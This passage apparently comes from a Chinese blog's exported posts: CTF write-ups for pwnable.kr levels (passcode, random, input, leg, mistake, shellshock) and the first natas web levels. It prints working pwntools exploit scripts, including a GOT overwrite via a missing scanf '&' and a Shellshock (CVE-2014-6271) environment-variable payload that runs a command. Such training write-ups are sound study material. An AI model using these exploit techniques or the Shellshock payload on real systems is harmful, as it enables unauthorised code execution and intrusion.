class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        welcome();</span><br><span class="line">        login();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// something after login...</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>key points:</strong></p>
<p>scanf函数:   <code>scanf(&quot;%d&quot;, passcode1);</code> 缺少一个&amp;这时函数执行时，会将passcode1作为地址进行写入操作，同理对应passcode2一样。一旦这两个不可控的地址是不可写或访问的，那么程序就crash了。</p>
<p>那么对passcode1和2地址的构造，然后利用scanf函数在该地址进行写入数据会是关键。</p>
<p><strong>Analyse</strong>：</p>
<p>函数流程分析</p>
<p>welcome:可以在name数组中写入长度位100字节的字符</p>
<p>接下来无缝执行</p>
<p>login： 对passcode1地址上进行写入数据   ➡  调用fflush(stdin);  ➡  输入passcode2  ➡check为真后输出flag</p>
<p>由于welcome()和login()这两个函数之间执行期间没有其他操作，可以分析得出前后进入这两个栈帧时，他们的EBP是一样的，自然可以想到我们可以领用name数组对passcode1和passcode2进行覆盖。</p>
<p><strong>IDA静态分析：</strong></p>
<p><img src="https://i.loli.net/2021/04/18/bqCXoTluzcWj5eL.png" alt="11.jpg"></p>
<p>name数组数组的地址为：EBP-70H</p>
<p><img src="https://i.loli.net/2021/04/18/w3GPp4bIgl7ZfcU.png" alt="12.jpg"></p>
<p>passcode1地址: EBP-10H</p>
<p>passcode2地址: EBP-0cH</p>
<p>welcome（）和login（）这两个函数栈帧的EBP一样只是我们的猜测，我们可以用gdb动态调试验证查看是否确实相同。</p>
<p>下载ELF文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">shell.download_file(<span class="string">&quot;./passcode&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>修改权限 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 777 passcode</span><br></pre></td></tr></table></figure>

<p>查看内存保护信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checksec passcode</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/18/qwV7mYUtJ6RSXy4.png" alt="13.jpg"></p>
<p>此处的RELRO信息为关键点，关于checksec 查看内存保护信息参阅这篇：</p>
<p>linux<a href="https://bupt3xplorer.github.io/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">内存保护信息</a></p>
<p>gdb动态调试：</p>
<p><img src="https://i.loli.net/2021/04/18/SFEnUXkT8G7AQsz.png" alt="9.jpg"></p>
<p><img src="https://i.loli.net/2021/04/18/txQLlR7ynCEM8Yq.png" alt="10.jpg"></p>
<p>查看验证：确实两个函数栈帧的EBP相同，那么自然想到可以利用name数组对passcode1和2进行覆盖，但是注意到数组name大小是100字节，name首地址到passcode1首地址距离为96，我们组多能利用name数组的最后四个字节覆盖passcode1，无法覆盖到passcode2</p>
<p>注意到输入passcode1后，立即执行了        fflush(stdin)  【用于更新缓冲区】函数，调用这个函数的时候会利用linux的动态延迟加载。</p>
<p>此处需要恶补一下GOT和PLT表的关系以及linux动态延迟加载的一些只是：</p>
<p><a href="https://cloud.tencent.com/developer/article/1590167?from=information.detail.linux%20%E5%8A%A8%E6%80%81%E5%BA%93%20%E5%BB%B6%E8%BF%9F%E5%8A%A0%E8%BD%BD">参考这篇非常详细</a></p>
<p><img src="https://i.loli.net/2021/04/19/dZJSNBM4QE7P3vx.png" alt="01.png"></p>
<p><img src="https://i.loli.net/2021/04/19/wVAyNBdLTXqC3fv.png" alt="02.png"></p>
<p>参阅完毕后就可以进行exp</p>
<p><strong>Hijack GOT</strong>：  <em>修改某个被调用函数的地址，让其指向另一个函数</em></p>
<p>这里我们修改调用fflush的地址，改为cat flag指令的地址，然后成功执行cat flag指令得到flag。</p>
<p>最后要做的就是找到调用fflush的地址和cat flag的地址，然后用name数组对passcode1覆盖为fflush的GOT表项地址，然后用scanf函数对GOT表象覆写为输出flag的指令即可。</p>
<p><img src="https://i.loli.net/2021/04/18/IaZwJ8Ay9U1Wz5O.png" alt="14.jpg"></p>
<p>找到fflush的GOT表项地址: 0x0804a004</p>
<p><img src="https://i.loli.net/2021/04/18/qzux2AWvXYVswIc.png" alt="15.jpg"></p>
<p>找到cat flag 指令地址为：0x080485E3</p>
<p>Exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">sysh_addr=<span class="number">0x080485E3</span></span><br><span class="line">fflush_got=<span class="number">0x0804a004</span></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*(<span class="number">100</span>-<span class="number">4</span>)+p32(fflush_got)</span><br><span class="line">sh=shell.run(<span class="string">&#x27;./passcode&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;enter you name :&quot;</span>,payload)</span><br><span class="line">payload=<span class="built_in">str</span>(sysh_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;enter passcode1 :&quot;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>一个C语言的知识点：如果用户在rand()之前没有调用过sand(),那么系统默认将1作为伪随机数的初始值，如果给定了一个值，那么每次rand()产生的随机数序列都是一样的。</p>
<p>EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;random&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>(<span class="number">3039230856</span>)</span><br><span class="line">sh=shell.run(<span class="string">&#x27;./random&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>主要考察linux的一些基本参数传递，这里就当做学习python的一些模块。。</p>
<p><strong>subprocess模块</strong></p>
<p>Demo:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">subprocess.run(args, *, stdin=<span class="literal">None</span>, <span class="built_in">input</span>=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, capture_output=<span class="literal">False</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, check=<span class="literal">False</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, text=<span class="literal">None</span>, env=<span class="literal">None</span>, universal_newlines=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>args：表示要执行的命令。必须是一个字符串，字符串参数列表。</li>
<li>stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是  subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者  None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用  os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。</li>
<li>timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。</li>
<li>check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。</li>
<li>encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。</li>
<li>shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。</li>
</ul>
<p><strong>os模块</strong></p>
<p>该模块提供了一些方便使用操作系统相关功能的函数。 </p>
<p><strong>fdopen()函数</strong>：创建文件对象</p>
<p>os.fdopen(<em>fd</em>, **args,**kwargs):返回打开文件描述符 <em>fd</em> 对应文件的对象。类似内建 open() 函数，二者接受同样的参数。不同之处在于 fdopen() 第一个参数应该为整数。</p>
<p><strong>open()函数：</strong>  打开文件对象</p>
<p><em>file</em> 是一个 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-path-like-object">path-like object</a>，表示将要打开的文件的路径（绝对路径或者当前工作目录的相对路径），也可以是要被封装的整数类型文件描述符。（如果是文件描述符，它会随着返回的 I/O 对象关闭而关闭，除非 <em>closefd</em> 被设为 <code>False</code> 。）</p>
<p><code>open</code>(<em>file</em>, <em>mode=’r’</em>, <em>buffering=-1</em>, <em>encoding=None</em>, <em>errors=None</em>, <em>newline=None</em>, <em>closefd=True</em>, <em>opener=None</em>)</p>
<p><em>mode</em> 是一个可选字符串，用于指定打开文件的模式。默认值是 <code>&#39;r&#39;</code>  ，这意味着它以文本模式打开并读取。其他常见模式有：写入 <code>&#39;w&#39;</code> （截断已经存在的文件）；排它性创建 <code>&#39;x&#39;</code> ；追加写 <code>&#39;a&#39;</code> （在 <em>一些</em>  Unix 系统上，无论当前的文件指针在什么位置，<em>所有</em> 写入都会追加到文件末尾）。在文本模式，如果 <em>encoding</em> 没有指定，则根据平台来决定使用的编码：使用 <code>locale.getpreferredencoding(False)</code> 来获取本地编码。（要读取和写入原始字节，请使用二进制模式并不要指定 <em>encoding</em>。）可用的模式有：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>&#39;r&#39;</code></td>
<td>读取（默认）</td>
</tr>
<tr>
<td><code>&#39;w&#39;</code></td>
<td>写入，并先截断文件</td>
</tr>
<tr>
<td><code>&#39;x&#39;</code></td>
<td>排它性创建，如果文件已存在则失败</td>
</tr>
<tr>
<td><code>&#39;a&#39;</code></td>
<td>写入，如果文件存在则在末尾追加</td>
</tr>
<tr>
<td><code>&#39;b&#39;</code></td>
<td>二进制模式</td>
</tr>
<tr>
<td><code>&#39;t&#39;</code></td>
<td>文本模式（默认）</td>
</tr>
<tr>
<td><code>&#39;+&#39;</code></td>
<td>更新磁盘文件（读取并写入）</td>
</tr>
</tbody></table>
<p>默认的模式是 <code>&#39;r&#39;</code> （打开并读取文本，同 <code>&#39;rt&#39;</code> ）。对于二进制写入， <code>&#39;w+b&#39;</code> 模式打开并把文件截断成 0 字节； <code>&#39;r+b&#39;</code> 则不会截断。</p>
<p><strong>os.pipe()</strong></p>
<p>创建一个管道，返回一对分别用于读取和写入的文件描述符 <code>(r, w)</code>。</p>
<p>Demo:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;The child will write text to a pipe and &quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;the parent will read the text written by child...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file descriptors r, w for reading and writing</span></span><br><span class="line">r, w = os.pipe() </span><br><span class="line"></span><br><span class="line">processid = os.fork()</span><br><span class="line"><span class="keyword">if</span> processid:</span><br><span class="line">    <span class="comment"># This is the parent process </span></span><br><span class="line">    <span class="comment"># Closes file descriptor w</span></span><br><span class="line">    os.close(w)</span><br><span class="line">    r = os.fdopen(r)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Parent reading&quot;</span></span><br><span class="line">    <span class="built_in">str</span> = r.read()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;text =&quot;</span>, <span class="built_in">str</span>   </span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># This is the child process</span></span><br><span class="line">    os.close(r)</span><br><span class="line">    w = os.fdopen(w, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Child writing&quot;</span></span><br><span class="line">    w.write(<span class="string">&quot;Text written by child...&quot;</span>)</span><br><span class="line">    w.close()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Child closing&quot;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>socket模块</strong></p>
<p><img src="https://i.loli.net/2021/04/19/myGR9Jws2AlfvFH.png" alt="111.jpg"></p>
<p>这个模块提供了访问BSD<em>套接字</em>的接口。在所有现代Unix系统、Windows、macOS和其他一些平台上可用。</p>
<p>这个Python接口是用Python的面向对象风格对Unix系统调用和套接字库接口的直译：函数socket() 返回一个 <em>套接字对象</em> ，其方法是对各种套接字系统调用的实现。形参类型一般与C接口相比更高级：例如在Python文件 <code>read()</code> 和 <code>write()</code> 操作中，接收操作的缓冲区分配是自动的，发送操作的缓冲区长度是隐式的。</p>
<p>Demo:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.socket(socket_family,socket_type,protocal=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>family: 套接字家族可以使 AF_UNIX 或者 AF_INET。</li>
<li>type: 套接字类型可以根据是面向连接的还是非连接分为 <code>SOCK_STREAM</code> 或 <code>SOCK_DGRAM</code>。</li>
<li>protocol: 一般不填默认为 0。</li>
</ul>
<p><strong>socket_family参数：</strong></p>
<p>1.基于文件类型的套接字家族</p>
<p>套接字家族的名字：AF_UNIX，unix一切皆文件，基于文件的套接字调用的就是底层的文件系统来取数据，两个套接字进程运行在同一机器，可以通过访问同一个文件系统间接完成通信。</p>
<p>2.基于网络类型的套接字家族</p>
<p>套接字家族的名字：AF_INET，还有AF_INET6被用于ipv6，还有一些其他的地址家族，不过，他们要么是只用于某个平台，要么就是已经被废弃，或者是很少被使用，或者是根本没有实现，所有地址家族中，AF_INET是使用最广泛的一个，python支持很多种地址家族，但是由于我们只关心网络编程，所以大部分时候我么只使用AF_INET。</p>
<p><strong>type指的是套接字类型，常用的类型有：</strong></p>
<p>SOCK_STREAM（TCP流）</p>
<p>SOCK_DGRAM（UDP数据报）</p>
<p>SOCK_RAW（原始套接字）<br>最后一个 <strong>“protocol”一般设置为“0”</strong>，也就是当确定套接字使用的协议簇和类型时，这个参数的值就为0，但是有时候创建原始套接字时，并不知道要使用的协议簇和类型，也就是domain参数未知情况下，这时protocol这个参数就起作用了，它可以确定协议的种类。<br> socket是一个函数，那么它也有返回值，当套接字创建成功时，返回套接字，失败返回“-1”，错误代码则写入“errno”中。</p>
<p><strong>一些socket函数:</strong></p>
<p>socket.connect(adress):</p>
<p>连接到 <em>address</em> 处的远程套接字。<em>address</em> 的格式取决于地址簇)</p>
<p>socket.send(bytes[,flags])</p>
<p>发送数据给套接字。本套接字必须已连接到远程套接字。</p>
<p>socket.close(fd)</p>
<p>关闭一个套接字文件描述符。它类似于os.close()，但是专用于套接字</p>
<p>Exp:</p>
<p>在/temp文件夹发现的python写的exp…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#argc=100</span></span><br><span class="line"><span class="comment">#argv[&#x27;A&#x27;]=&#x27;x00&#x27;</span></span><br><span class="line"><span class="comment">#argv[&#x27;B&#x27;]=&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">argc = <span class="built_in">list</span>(<span class="string">&#x27;A&#x27;</span>) * <span class="number">100</span></span><br><span class="line">argc[<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">argc[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">b&#x27;\x20\x0a\x0d&#x27;</span> </span><br><span class="line"><span class="comment">#set socket port</span></span><br><span class="line">argc[<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&quot;5555&quot;</span></span><br><span class="line">argc[<span class="number">0</span>] = <span class="string">&#x27;/home/input2/input&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">stdin_r, stdin_w = os.pipe()</span><br><span class="line">stderr_r, stderr_w = os.pipe()</span><br><span class="line">os.write(stdin_w, <span class="string">b&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">os.write(stderr_w, <span class="string">b&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">environ = &#123;<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span> : <span class="string">b&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">b&#x27;\x0a&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sh = subprocess.Popen(argc, stdin = stdin_r, stderr = stderr_r, env = environ)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#5</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">5555</span>))</span><br><span class="line">s.send(<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>另外一个Tips：</strong></p>
<p>t权限（粘着位SBIT）：任何人在该目录下有写权限，但是普通用户不能删除别人的文件</p>
<p>查看到tmp目录下普通用户有-wt权限，我们进入tmp目录后创建自己的一个目录然后执行a.py</p>
<p>注意到当前目录下并没有flag，我们需要创建软连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln /home/input/flag flag</span><br></pre></td></tr></table></figure>



<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><p><strong>ARM汇编：</strong></p>
<p>这篇一步到位。<a href="https://azeria-labs.com/arm-instruction-set-part-3/">点我</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;: mov r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:    mov r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:    sub sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:    bx  lr</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.返回值存储在r0寄存器</p>
<p>ARM处理器有两种工作状态：ARM状态和Thumb状态。处理器可以在两种状态下随意切换。</p>
<p>处于ARM状态时，执行32位字对齐的ARM指令。</p>
<p>处于Thumb状态时，执行16位对齐的Thumb指令。</p>
<p>2.两种工作状态：</p>
<p>ARM 和 Thumb 指令集的动态切换，是通过 BX 指令使用一个寄存器名作为参数来完成。<br>程序控制权被转交给该寄存器中存储的地址 ( LSB 位被屏蔽 )。</p>
<p>如果 LSB=1, 则进入 Thumb 指令处理模式； 如果 LSB=0, 则进入 ARM 指令处理模式。</p>
<p>通俗点讲其实就是BX 跳转的地址最低位为1还是0来判断是进入Thumb指令处理模式还是进人ARM指令处理模式</p>
<p>3.Thumb模式下PC值=当前指令地址值+8</p>
<p>key1=0x00008cdc+8</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:    push    &#123;r6&#125;        ; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:    add    r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:    bx    r6           ;此时r6最后一位是1,进入ARM thumb模式 pc&#x3D;adress+4</span><br><span class="line">   0x00008d04 &lt;+20&gt;:    mov    r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:    adds    r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:    pop    &#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:    pop    &#123;r6&#125;        ; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>这里返回值由r3传入。然后再看一下地址  0x00008d00 &lt;+16&gt;这里，有个bx r6，而r6等于pc+1即0x8d05，最低为为1，所以执行bx r6之后会进入thumb模式，这样就会变成2字节对齐，pc存储着当前指令加4的位置，如此一来，下面的mov r3,pc中，r3等于0x8d04+0x4。下一条为adds r3，#4，表示r3 = r3 + 4后更新标志位，因此r3 = 0x8d04 + 0x4 + 0x4。</p>
<p>key2=0x8d04 + 0x4 + 0x4</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;: mov r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:    mov r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:    sub sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:    bx  lr</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最终key3=lr的值</p>
<p>lr寄存器也即R14寄存器，用作子程序链接，称为链接寄存器LK (Link Register)。</p>
<p>作用：使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回</p>
<p>在main函数找到调用key时的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;</span><br><span class="line">0x00008d80 &lt;+68&gt;:	mov	r3, r0</span><br></pre></td></tr></table></figure>

<p>BL指令：</p>
<p>B或BL指令引起处理器转移到“子程序名”处开始执行。<br>两者的不同之处在于:<br>(1)BL指令在转移到子程序执行之前，将其下一条指令的地址拷贝到R14（LR,链接寄存器）。<br>   由于BL指令保存了下条指令的地址，因此使用指令“MOV PC ,LR”即可实现子程序的返回。<br>(2)B指令则无法实现子程序的返回，只能实现单纯的跳转。用户在编程的时候，可根据具体应用选用合适的子程序调用语句。</p>
<p>key3=0x8d80</p>
<p>三个数相加即可 </p>
<p>Exp:  108400</p>
<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>符号优先级相关</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>比较运算符优先级高于赋值运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对，而另一方面，0作为文件描述符，它指向的是stdin。</p>
<p>两个输入都由我们构造，自由发挥即可。。</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;mistake&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">sh=shell.run(<span class="string">&#x27;./mistake&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;B&#x27;</span>*<span class="number">10</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;do not bruteforce...\n&quot;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;C&#x27;</span>*<span class="number">10</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;input password : &quot;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>CVE-2014-6271（破壳漏洞）面向Google解题</p>
<p><a href="https://blog.csdn.net/tinyletero/article/details/40261593">Link</a></p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;shellshock&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">sh=shell.run(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;env x=&#x27;() &#123; :;&#125;; bash -c \&quot;cat flag\&quot; &#x27; ./shellshock&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><h2 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h2><h2 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h2><h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><h2 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h2><h2 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h2><h2 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h2><h2 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h2><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h2 id="blukat"><a href="#blukat" class="headerlink" title="blukat"></a>blukat</h2><h2 id="horcruxes"><a href="#horcruxes" class="headerlink" title="horcruxes"></a>horcruxes</h2>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Web题解_natas</title>
    <url>/2021/04/20/Web_1/</url>
    <content><![CDATA[<h1 id="Web题解-natas"><a href="#Web题解-natas" class="headerlink" title="Web题解_natas"></a>Web题解_natas</h1><p>Easy_web入门刷题</p>
<h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level_0"></a><strong>Level_0</strong></h2><p>Check Souce code</p>
<h2 id="Level-0➡Level-1"><a href="#Level-0➡Level-1" class="headerlink" title="Level_0➡Level_1"></a><strong>Level_0➡Level_1</strong></h2><p>Check Souce code</p>
<h2 id="Level-1➡Level-2"><a href="#Level-1➡Level-2" class="headerlink" title="Level_1➡Level_2"></a><strong>Level_1➡Level_2</strong></h2><p>发现有个png图片，访问上级目录可查看到有flag的txt文档</p>
<h2 id="Level-2➡Level-3"><a href="#Level-2➡Level-3" class="headerlink" title="Level_2➡Level_3"></a><strong>Level_2➡Level_3</strong></h2><h2 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a><strong>Robots协议</strong></h2><p>访问/robots.txt查看到存在目录/s3cr3t/访问即可得到flag</p>
<h2 id="Level-3➡Level-4"><a href="#Level-3➡Level-4" class="headerlink" title="Level_3➡Level_4"></a><strong>Level_3➡Level_4</strong></h2><p>根据提示用Burpsuite抓包改HTTPReferer发送即可</p>
